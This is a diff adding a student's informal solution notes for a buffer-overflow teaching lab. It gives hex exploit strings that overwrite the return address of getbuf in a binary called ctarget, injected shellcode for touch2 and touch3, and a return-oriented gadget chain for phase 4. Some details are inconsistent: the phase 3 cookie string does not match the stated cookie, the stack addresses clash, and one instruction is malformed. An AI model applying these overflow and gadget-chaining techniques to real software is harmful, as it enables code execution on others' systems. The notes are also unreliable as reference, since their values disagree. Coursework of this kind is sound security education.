@@ -1,0 +1,65 @@
+how to run ./hex2raw < phase1.txt > raw-phase1.txt
+	   ./ctarget < raw-phase1.txt
+		
+
+//phase1
+sub $0x18,%rsp, I can see that 24 (0x18) bytes of buffer is allocated for getbuf.
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00 //the first 24 bytes are just padding (0x18 in getbuf)*/
+a4 13 40 00 00 00 00 00 /* touch1 address */
+
+//phase2 
+//******
+movq $0x2c1c02c3,%rdi /* move your cookie to register %rdi */
+retq                  /* return */
+
+****/
+//*gcc -c phase2.s
+objdump -d phase2.o  > phase2.d 
+
+0x55659b18 //address of my string */
+
+
+48 c7 c7 c3 02 1c 2c c3 /* this is my cookies */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes */
+18 9b 65 55 00 00 00 00 /*address of register %rsp (x/s $rsp) that got from my string*/
+d0 13 40 00 00 00 00 00 /* address of touch2 function */
+
+
+
+
+///phase3
+./ctarget < raw-phase3.txt
+**********
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 40 9b 65 55 	mov    $0x55659b40,%rdi
+   7:	c3                   	retq 
+
+*********** 
+//buffer + 8 bytes for return address of rsp + 8 bytes for touch3 //
+//0x18 + 8 + 8 = 28 (40 Decimal)//
+//0x55659b18 + 0x28 = 55659b40 //
+48 c7 c7 40 9b 65 55 c3  /*rsp + 28 the address where the cookie is present in phase2.d*/
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /*padding*/
+78 fb 63 55 00 00 00 00 /* return address ($rsp), x/s $rsp */
+e8 13 40 00 00 00 00 00  /* touch3 address -- get this from the ctarget dump file */
+31 63 30 30 39 36 65 31  /* cookie string, convert my cookies to string*/
+
+
+//phase4
+popq %rax
+movq %rax %edi
+ret 
+////
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+87 15 40 00 00 00 00 00 /* gedget1, pop %rax, address starts at third byte in getval_289 */
+c3 02 1c 2c 00 00 00 00 /* my cookies 0x2c1c02c3 */
+9b 15 40 00 00 00 00 00 /* gedget2: move %rax to %rdi, address starts at 2nd byte in setval_374 */
+d0 13 40 00 00 00 00 00 /* touch2 address */
